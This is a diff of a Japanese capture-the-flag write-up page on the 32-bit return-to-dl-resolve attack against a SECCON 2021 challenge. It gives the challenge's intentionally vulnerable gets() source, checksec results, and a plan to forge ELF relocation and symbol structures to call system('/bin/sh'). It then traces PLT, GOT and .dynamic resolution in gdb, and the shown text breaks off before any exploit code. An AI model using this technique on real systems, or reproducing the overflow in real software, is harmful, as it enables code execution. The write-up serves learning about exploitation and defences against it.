@@ -28,8 +28,6 @@
     <ul>
     
     
-    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/members/" title="">Members</a></li>
-    
     <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/writeups/" title="">Writeups</a></li>
     
     <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/news/" title="">News</a></li>
@@ -45,555 +43,658 @@
     </header>
     <div class="content__body">
         
-<div id="outline-container-headline-1" class="outline-3">
 <h3 id="headline-1">
 問題
 </h3>
-<div id="outline-text-headline-1" class="outline-text-3">
-<div id="outline-container-headline-2" class="outline-4">
 <h4 id="headline-2">
 問題文
 </h4>
-<div id="outline-text-headline-2" class="outline-text-4">
 <pre class="example">
 ## Question
 Do you understand return-to-dl-resolve attack on 32-bit?
 </pre>
-</div>
-</div>
-<div id="outline-container-headline-3" class="outline-4">
 <h4 id="headline-3">
 配布ファイル
 </h4>
-<div id="outline-text-headline-3" class="outline-text-4">
 <ul>
-<li><code>main.c</code></li>
-<li><code>chall</code></li>
+<li>
+<p>
+<code>main.c</code>
+</p>
+</li>
+<li>
+<p>
+<code>chall</code>
+</p>
+</li>
 </ul>
-<div id="outline-container-headline-4" class="outline-5">
 <h5 id="headline-4">
 <code>main.c</code>
 </h5>
-<div id="outline-text-headline-4" class="outline-text-5">
 <div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x80</span>];
-</span></span><span style="display:flex;"><span>      gets(buf);
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+      <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x80</span>];
+      gets(buf);
+      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }</code></pre></div>
 </div>
-</div>
-</div>
-<div id="outline-container-headline-5" class="outline-5">
 <h5 id="headline-5">
 <code>chall</code>
 </h5>
-<div id="outline-text-headline-5" class="outline-text-5">
 <pre class="example">
 mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ file chall
 chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cb260735eeb00c173f7f530e9fae9ee3704e6c6f, for GNU/Linux 3.2.0, not stripped
 
 mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
-[*] &#39;/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall&#39;
+[*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 </pre>
+<p>
+実行ファイルに <code>file</code> コマンドと <code>checksec</code> を用いると、以下の特徴があることがわかる。
+</p>
 <ul>
-<li>x86</li>
-<li>SSP無効</li>
-<li>Partial RELRO</li>
+<li>
+<p>
+x86
+</p>
+</li>
+<li>
+<p>
+SSP (Stack Smashing Protection) 無効
+</p>
+</li>
+<li>
+<p>
+Partial RELRO
+</p>
+</li>
 </ul>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-6" class="outline-3">
 <h3 id="headline-6">
 方針
 </h3>
-<div id="outline-text-headline-6" class="outline-text-3">
-<p>配布されたソースコード ( <code>main.c</code> )を見てみると、以下の特徴がある。</p>
+<p>
+配布されたソースコード ( <code>main.c</code> )を見てみると、以下の特徴がある。
+</p>
 <ul>
-<li><code>buf</code> のサイズが <code>0x80</code> </li>
-<li><code>gets</code> を使用しているため、 <code>buf</code> に任意の文字数を入力可能</li>
+<li>
+<p>
+<code>char</code> 型の配列 <code>buf</code> のサイズが <code>0x80</code> バイト 
+</p>
+</li>
+<li>
+<p>
+<code>gets</code> を使用しているため、 <code>\n</code> (0x0a) が入力されるまで配列 <code>buf</code> に任意の文字を入力可能
+</p>
+</li>
 </ul>
 <p>
-このことから，配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる．</p>
+このことから、配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる。
+</p>
 <p>
-また、問題文に <code>return to dl resolve</code> という攻撃方法を使用すれば良い旨のコメントがあるため，
-スタックバッファオーバフローを利用して， <code>return to dl resolve</code> を用いて <code>shell</code> を起動できるとよさそうである．</p>
+また、問題文に <code>return to dl resolve</code> という攻撃方法を使用すれば良い旨のコメントがあるため、
+スタックバッファオーバフローを利用して、 <code>return to dl resolve</code> を用いて <code>shell</code> を起動できるとよさそうである。
+</p>
 <p>
-よって、この問題以下の方針で解いていく。</p>
+よって、この問題以下の方針で解いていく。
+</p>
 <ol>
-<li><strong>return to dl resolve</strong> を利用するため、 <code>.plt</code> セクションからライブラリ関数のアドレスが解決するまでの流れを調査</li>
-<li>1.を踏まえて、 <strong>return to dl resolve</strong> を利用し、 <code>shell</code> を起動</li>
+<li>
+<p>
+<strong>return to dl resolve</strong> を利用するため、 <code>.plt</code> セクションからライブラリ関数のアドレスを解決するまでの流れを調査
+</p>
+</li>
+<li>
+<p>
+1.を踏まえて、 <strong>return to dl resolve</strong> を利用し、 <code>shell</code> を起動
+</p>
+</li>
 </ol>
-</div>
-</div>
-<div id="outline-container-headline-7" class="outline-3">
 <h3 id="headline-7">
 1. return to dl resolve (ret2dl resolve)
 </h3>
-<div id="outline-text-headline-7" class="outline-text-3">
-<p>return to dl resolveは、ライブラリ関数のアドレスを動的に解決する際に呼び出される関数である <code>_dl_runtime_resolve_xsavec</code> を利用し、任意のライブラリ関数を呼び出す攻撃手法である。</p>
 <p>
-   この攻撃の流れは以下のようになる。</p>
+return to dl resolveは、ライブラリ関数のアドレスを動的に解決する際に呼び出される関数である <code>_dl_runtime_resolve</code> を利用し、任意のライブラリ関数を呼び出す攻撃手法である。
+</p>
+<p>
+   この攻撃の流れは以下のようになる。
+</p>
 <ol>
-<li>任意の関数(ここでは <code>shell</code> )を呼ぶため、 <code>_dl_runtime_resolve_xsavec</code> に読み込ませる偽の <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体、および  <code>system</code> 、 <code>/bin/sh</code> を書き込み可能な領域に用意</li>
-<li><code>_dl_runtime_resolve_xsavec</code> が <code>Elf32_Rel</code> 構造体を特定するために引数に取る <code>reloc_arg</code> を、偽の <code>Elf32_Rel</code> を指すように指定</li>
-<li><code>.plt</code> の先頭にジャンプし、偽の構造体を元に <code>system</code> のアドレスを解決し、 <code>system(&#34;/bin/sh&#34;)</code> を実行</li>
+<li>
+<p>
+任意の関数(ここでは <code>shell</code> )を呼ぶため、 <code>_dl_runtime_resolve</code> に読み込ませる偽の <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体のオブジェクト、および NULL終端文字列 <code>&#34;system&#34;</code> と <code>&#34;/bin/sh&#34;</code> を書き込み可能な領域に用意
+</p>
+</li>
+<li>
+<p>
+<code>_dl_runtime_resolve</code> が <code>Elf32_Rel</code> 構造体を特定するために引数に取る <code>reloc_arg</code> を、1.で用意した <code>Elf32_Rel</code> 構造体のオブジェクトを指すように指定
+</p>
+</li>
+<li>
+<p>
+<code>.plt</code> の先頭にジャンプし、1.で用意した構造体のオブジェクトを元に <code>system</code> のアドレスを解決し、 <code>system(&#34;/bin/sh&#34;)</code> を実行
+</p>
+</li>
 </ol>
-<p>そこで、以下では、pltセクションからアドレス解決の流れを説明し、如何にして偽の構造体を作成すればよいかについて説明する。</p>
-<div id="outline-container-headline-8" class="outline-4">
+<p>
+そこで、以下では、 <code>.plt</code> セクションからのアドレス解決の流れを説明し、どのようにして偽の構造体を作成すればよいかについて説明する。
+</p>
 <h4 id="headline-8">
+<code>main</code> から <code>gets</code> が呼び出される全体の流れ
+</h4>
+<p>
+問題のプログラムをディスアセンブルし、どのようにして <code>gets</code> が呼び出されているのか確認してみる。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049180 &lt;main&gt;:
+8049180:       55                      push   ebp
+8049181:       89 e5                   mov    ebp,esp
+8049183:       81 ec 98 00 00 00       sub    esp,0x98
+8049189:       8d 85 7c ff ff ff       lea    eax,[ebp-0x84]
+804918f:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0
+8049196:       89 04 24                mov    DWORD PTR [esp],eax
+8049199:       e8 a2 fe ff ff          call   8049040 &lt;gets@plt&gt;
+804919e:       31 c9                   xor    ecx,ecx
+80491a0:       89 85 78 ff ff ff       mov    DWORD PTR [ebp-0x88],eax
+80491a6:       89 c8                   mov    eax,ecx
+80491a8:       81 c4 98 00 00 00       add    esp,0x98
+80491ae:       5d                      pop    ebp
+80491af:       c3                      ret</code></pre></div>
+</div>
+<p>
+ディスアセンブルした <code>main</code> を見てみると、 <code>0x8049199</code> のアドレスにおいて、 <code>gets@plt</code> である <code>0x8049040</code> にジャンプしている。 <code>gets@plt</code> は、 <code>.plt</code> セクションに存在するため、 <code>.plt</code> セクションもディスアセンブルしてみる。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049030 &lt;.plt&gt;:
+8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
+8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
+804903c:       00 00                   add    BYTE PTR [eax],al
+    ...
+
+08049040 &lt;gets@plt&gt;:
+8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
+8049046:       68 00 00 00 00          push   0x0
+804904b:       e9 e0 ff ff ff          jmp    8049030 &lt;.plt&gt;
+
+08049050 &lt;__libc_start_main@plt&gt;:
+8049050:       ff 25 10 c0 04 08       jmp    DWORD PTR ds:0x804c010
+8049056:       68 08 00 00 00          push   0x8
+804905b:       e9 d0 ff ff ff          jmp    8049030 &lt;.plt&gt;</code></pre></div>
+</div>
+<p>
+先程呼ばれた <code>gets@plt</code> を確認してみると、 まず <code>jmp    DWORD PTR ds:0x804c00c</code> で <code>0x804c00c</code> 番地に格納されたアドレスへジャンプしている。この <code>0x804c00c</code> のアドレスは、GOTと呼ばれる領域にあり、最終的に解決された <code>gets</code> のアドレスが格納される。
+</p>
+<p>
+    ここで、checksecの結果から、配布された実行ファイルは <strong>Partial RELRO</strong> であることがわかっている。
+    <strong>Partial RELRO</strong> は、共有ライブラリが遅延バインドされることを表しており、1回目のライブラリ関数の呼び出しの際に、共有ライブラリのアドレスを解決し、解決したアドレスをGOTへ格納する。
+    このため、2回目以降のライブラリ関数の呼び出しは、GOTに格納された解決済のアドレスへジャンプすることで可能となる。
+</p>
+<p>
+そこで、1回目の <code>gets@plt</code> の呼び出し時に、GOTには何が格納されているのか確認してみる。
+</p>
+<p>
+    以下は、 <code>gets@plt</code> を呼び出す前のGOTの状態。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 2
+
+[0x804c00c] gets@GLIBC_2.0  →  0x8049046
+[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7de1de0</code></pre></div>
+</div>
+<p>
+GOTを確認すると、次の命令のアドレス ( <code>0x8049046</code> )がGOTに格納されていることがわかる。
+    このため、引き続き <code>0x8049046</code> からの命令読んでいく。
+</p>
+<p>
+    次の命令 <code>push   0x0</code> では、スタックに <code>0x0</code> を積み、その後 <code>jmp    8049030 &lt;.plt&gt;</code> で <code>.plt</code> セクションの先頭にジャンプしている。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049030 &lt;.plt&gt;:
+8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
+8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
+804903c:       00 00                   add    BYTE PTR [eax],al</code></pre></div>
+</div>
+<p>
+    <code>.plt</code> の先頭の命令は、 <code>push   DWORD PTR ds:0x804c004</code> となっており、 <code>0x804c004</code> に格納されている値をスタックに積む。
+    そして、次の命令 <code>jmp    DWORD PTR ds:0x804c008</code> で <code>0x804c008</code> に格納されているアドレスへジャンプする。
+</p>
+<p>
+    ここで、 <code>0x804c004</code> および <code>0x804c008</code> 番地には何が格納されているのか調べてみる。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  hexdump dword 0x804c004
+0x0804c004│+0x0000   &lt;_GLOBAL_OFFSET_TABLE_+0004&gt; 0xf7ffd990   
+0x0804c008│+0x0004   &lt;_GLOBAL_OFFSET_TABLE_+0008&gt; 0xf7fe7ac0</code></pre></div>
+</div>
+<p>
+すると、これらのアドレスはGOT先頭付近のアドレスであり、それぞれ <code>0xf7ffd990</code> と <code>0xf7fe7ac0</code> の値が格納されていることがわかる。
+</p>
+<p>
+    まとめると、 <code>.plt</code> の先頭の命令では、スタックに <code>0xf7ffd990</code> を積み、 <code>0xf7fe7ac0</code> 番地へジャンプしている。
+    そして、 <code>0xf7fe7ac0</code> へジャンプ後、 <code>gets</code> のアドレスが解決され、 <code>gets</code> が実行される。
+    また、二回目以降の呼び出しのために、解決されたアドレスは、GOTへ格納される。
+</p>
+<p>
+    以上が <code>main</code> から <code>gets</code> が実行されるまでの流れであり、 <code>return to dl resolve</code> をするために必要となる <code>.plt</code> セクション以降の流れについて以降では詳しく見ていく。
+</p>
+<h4 id="headline-9">
 <code>.plt</code> セクションからアドレス解決の流れ
 </h4>
-<div id="outline-text-headline-8" class="outline-text-4">
-<p><code>.plt</code> セクションから、 <code>link_map</code> 構造体を元にそれぞれのセクションのアドレスが特定され、それぞれのセクションに含まれる情報を参照することにより、ライブラリ関数のシンボルを解決する。</p>
 <p>
-    そこで、以下では、 <code>gets@plt</code> が呼び出されてから <code>gets</code> のシンボルが解決されるまでの流れを示す。</p>
+さて、 <code>main</code> から <code>gets</code> が呼び出される全体像が掴めたところで、最後にジャンプしたアドレス <code>0xf7fe7ac0</code> から先を追ってみる。
+</p>
 <p>
-    参考</p>
-<pre class="example">
-    .rel.plt                         .dynsym                                           .dynstr                                    
-        |                                |                                                 |
-        |                                |                                                 |
-reloc_arg---+   reroc_arg + .rel.plt         |                                                 |
-        |                                |                                                 |
-        +--&gt;|-----------+----------|     |                                                 |
-            | Elf32_Rel | r_offset |     |                                                 |
-            |           | r_info   |-----+  (r_info&gt;&gt;8 + .dynsym)*sizeof(Elf32_Sym)        |
-            |-----------+----------|     |                                                 |
-                                         |                                                 |
-                                         +-&gt;|-----------+---------------------------|      |
-                                            | Elf32_Sym | st_name                   |------+   st_name + .dynstr
-                                            |           | st_value                  |      |
-                                            |           | st_size                   |      |
-                                            |           | st_info st_other st_shndx |      |
-                                            |-----------+---------------------------|      |
-                                                                                           |
-                                                                                           +--&gt;|-----------+----------|
-                                                                                               | symbol    |  &#39;gets&#39;  |
-                                                                                               |-----------+----------|
-</pre>
-<div id="outline-container-headline-9" class="outline-5">
-<h5 id="headline-9">
-<code>link_map</code> 構造体
-</h5>
-<div id="outline-text-headline-9" class="outline-text-5">
-<p><code>link_map</code> はELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス，再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。   </p>
+    ジャンプ先の <code>0xf7fe7ac0</code> は <code>_dl_runtime_resolve</code> となっており、この関数により <code>gets</code> のアドレスが解決される。
+     <code>_dl_runtime_resolve</code> は引数として <code>link_map</code> 構造体と、後述する <code>Elf32_Rel</code> 構造体へのオフセットを示す <code>reloc_arg</code> という2つの値を取る。
+</p>
 <p>
-   <code>plt</code> にジャンプする前に、 <code>link_map</code> 構造体のアドレス（GOTの2番目のエントリ）とGOTのオフセット ( <code>reloc_arg</code> )がスタックに格納される。</p>
-<ul>
-<li><a href="https://elixir.bootlin.com/glibc/latest/source/include/link.h#L86">https://elixir.bootlin.com/glibc/latest/source/include/link.h#L86</a></li>
-</ul>
-<div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     members form a chain of all the shared objects loaded at startup.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     These data structures exist in space used by the run-time dynamic linker;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     modifying them may have disastrous results.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     This data structure might change in future, if necessary.  User-level
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     programs must avoid defining objects of this type.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> link_map
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* These first few members are part of the protocol with the debugger.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  This is the same format used in SVR4.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>      ElfW(Addr) l_addr;		<span style="color:#75715e">/* Difference between the address in the ELF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">			      file and the addresses in memory.  */</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>l_name;		<span style="color:#75715e">/* Absolute file name object was found in.  */</span>
-</span></span><span style="display:flex;"><span>      ElfW(Dyn) <span style="color:#f92672">*</span>l_ld;		<span style="color:#75715e">/* Dynamic section of the shared object.  */</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> link_map <span style="color:#f92672">*</span>l_next, <span style="color:#f92672">*</span>l_prev; <span style="color:#75715e">/* Chain of loaded objects.  */</span></span></span></code></pre></div>
-</div>
+    そこで、ここから先では、 <code>_dl_runtime_resolve</code> を呼び出す際にスタックに積まれた <code>0xf7ffd990</code> を <code>_dl_runtime_resolve</code> の第一引数である <code>link_map</code> 構造体のアドレス、 <code>0x0</code> を第二引数である <code>reloc_arg</code> として扱う。
+</p>
 <p>
-     以下の例の場合， <code>link_map</code> 構造体のアドレス <code>0x804c004</code> と <code>gets</code> の <code>reloc_arg</code> <code>0x0</code> をスタックにプッシュしている。</p>
-<div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    gef➤  x/10i $eip
-</span></span><span style="display:flex;"><span>    =&gt; 0x8049030:   push   DWORD PTR ds:0x804c004
-</span></span><span style="display:flex;"><span>0x8049036:   jmp    DWORD PTR ds:0x804c008
-</span></span><span style="display:flex;"><span>0x804903c:   add    BYTE PTR [eax],al
-</span></span><span style="display:flex;"><span>0x804903e:   add    BYTE PTR [eax],al
-</span></span><span style="display:flex;"><span>0x8049040 &lt;gets@plt&gt;:        jmp    DWORD PTR ds:0x804c00c
-</span></span><span style="display:flex;"><span>0x8049046 &lt;gets@plt+6&gt;:      push   0x0
-</span></span><span style="display:flex;"><span>0x804904b &lt;gets@plt+11&gt;:     jmp    0x8049030
-</span></span><span style="display:flex;"><span>0x8049050 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804c010
-</span></span><span style="display:flex;"><span>0x8049056 &lt;__libc_start_main@plt+6&gt;: push   0x8
-</span></span><span style="display:flex;"><span>0x804905b &lt;__libc_start_main@plt+11&gt;:        jmp    0x8049030</span></span></code></pre></div>
-</div>
-<p>
-   以下のサイトを参考に、gdbで、ELFの構造体を読み込めるようにする。</p>
-<ul>
-<li>
-<p><a href="https://inaz2.hatenablog.com/entry/2014/07/21/124857">https://inaz2.hatenablog.com/entry/2014/07/21/124857</a></p>
-<ul>
-<li>
-<p>gdbに <code>link.h</code> および <code>elf.h</code> のシンボル情報を読み込み</p>
-<div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gcc -g -fno-eliminate-unused-debug-types -x c -m32 -c /usr/include/link.h -o link.o</span></span></code></pre></div>
-</div>
-<p>今回はx86のELFを対象としているため <code>-m32</code> オプションを指定</p>
-</li>
-</ul>
-</li>
-</ul>
-<p>特定した <code>link_map</code> 構造体のアドレス <code>0xf7ffd990</code> の中身を表示してみる。</p>
-<div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  add-symbol-file link.o 0
-</span></span><span style="display:flex;"><span>add symbol table from file &#34;link.o&#34; at
-</span></span><span style="display:flex;"><span>.text_addr = 0x0
-</span></span><span style="display:flex;"><span>Reading symbols from link.o...
-</span></span><span style="display:flex;"><span>gef➤  set $l = (struct link_map *) 0xf7ffd990
-</span></span><span style="display:flex;"><span>gef➤  print *$l
-</span></span><span style="display:flex;"><span>$1 = {
-</span></span><span style="display:flex;"><span> l_addr = 0x0,
-</span></span><span style="display:flex;"><span> l_name = 0xf7ffdc84 &#34;&#34;,
-</span></span><span style="display:flex;"><span> l_ld = 0x804bf14,
-</span></span><span style="display:flex;"><span> l_next = 0xf7ffdc90,
-</span></span><span style="display:flex;"><span> l_prev = 0x0
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-10" class="outline-5">
+それでは、次にライブラリ関数のシンボルの解決をする際に必要な情報を含んでいるそれぞれのセクションについて調べていく。    
+</p>
 <h5 id="headline-10">
 <code>.dynamic</code> セクション
 </h5>
-<div id="outline-text-headline-10" class="outline-text-5">
-<p><code>.dynamic</code> セクションのアドレスは， <code>link_map</code> 構造体の <code>l_ld</code> に格納されるため、
-  <code>.dynamic</code> セクションのアドレスは <code>0x804bf14</code> であるとわかる。</p>
 <p>
-  <code>.dynamic</code> セクションは， <code>ELF_Dyn</code> 構造体のエントリを <code>d_tag</code> の種類の数保持しており、この中に <code>.rel.plt</code> や <code>.dynsym</code> , <code>.dynstr</code> などのアドレスが格納されている。</p>
-<ul>
-<li>
-<p>ELF_Dyn 構造体</p>
-<ul>
-<li><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L838">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L838</a></li>
-</ul>
-</li>
-</ul>
-<div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Dynamic section entry.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf32_Sword d_tag;			<span style="color:#75715e">/* Dynamic entry type */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span>
-</span></span><span style="display:flex;"><span>      {
-</span></span><span style="display:flex;"><span>	Elf32_Word d_val;			<span style="color:#75715e">/* Integer value */</span>
-</span></span><span style="display:flex;"><span>	Elf32_Addr d_ptr;			<span style="color:#75715e">/* Address value */</span>
-</span></span><span style="display:flex;"><span>      } d_un;
-</span></span><span style="display:flex;"><span>  } Elf32_Dyn;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf64_Sxword d_tag;			<span style="color:#75715e">/* Dynamic entry type */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span>
-</span></span><span style="display:flex;"><span>      {
-</span></span><span style="display:flex;"><span>	Elf64_Xword d_val;		<span style="color:#75715e">/* Integer value */</span>
-</span></span><span style="display:flex;"><span>	Elf64_Addr d_ptr;			<span style="color:#75715e">/* Address value */</span>
-</span></span><span style="display:flex;"><span>      } d_un;
-</span></span><span style="display:flex;"><span>  } Elf64_Dyn;</span></span></code></pre></div>
-</div>
-<ul>
-<li>
-<p>d_tagの定義</p>
-<ul>
-<li><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L860">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L860</a></li>
-</ul>
-</li>
-</ul>
-<div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
-</span></span><span style="display:flex;"><span>  ...
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...</span></span></code></pre></div>
-</div>
+<code>.dynamic</code> セクションは、 <code>.rel.plt</code> や <code>.dynsym</code> , <code>.dynstr</code> セクションなどのアドレス情報を保持しているセクションである。
+</p>
 <p>
-    また、このとき <code>.dynamic</code> セクションは， <code>d_tag</code> の順番に並んでいる訳ではないことに注意。</p>
-<ul>
-<li>
-<p>以下の例では， <code>DT_STRTAB, DT_SYMTAB</code> は8，9番目のエントリ， <code>DT_JMPREL, DT_REL</code> は16，17番目のエントリに配置</p>
+  このため、ライブラリ関数のシンボルを解決をする際は、 <code>.dynamic</code> セクションを最初に参照し、シンボル解決に必要な情報を含むセクションが配置されているアドレスを取得する。
+</p>
+<p>
+  <code>.dynamic</code> セクションは、 <code>Elf32_Dyn</code> 構造体のオブジェクトが連続して配置されている。
+</p>
+<p>
+  そこで、 <code>Elf32_Dyn</code> 構造体の定義をgdbで参照してみる。
+</p>
+<p>
+  gdbから、構造体の定義を得るために、libcにおけるデバッグ情報を取得しておく。
+</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0x0804bf14│+0x0000   &lt;_DYNAMIC+0000&gt; 0x00000001
-</span></span><span style="display:flex;"><span>0x0804bf18│+0x0004   &lt;_DYNAMIC+0004&gt; 0x00000001
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>0x0804bf54│+0x0040   &lt;_DYNAMIC+0040&gt; 0x00000005 // DT_STRTAB
-</span></span><span style="display:flex;"><span>0x0804bf58│+0x0044   &lt;_DYNAMIC+0044&gt; 0x0804825c
-</span></span><span style="display:flex;"><span>0x0804bf5c│+0x0048   &lt;_DYNAMIC+0048&gt; 0x00000006 // DT_SYMTAB
-</span></span><span style="display:flex;"><span>0x0804bf60│+0x004c   &lt;_DYNAMIC+004c&gt; 0x0804820c
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>0x0804bf94│+0x0080   &lt;_DYNAMIC+0080&gt; 0x00000017 // DT_JMPREL
-</span></span><span style="display:flex;"><span>0x0804bf98│+0x0084   &lt;_DYNAMIC+0084&gt; 0x080482d8
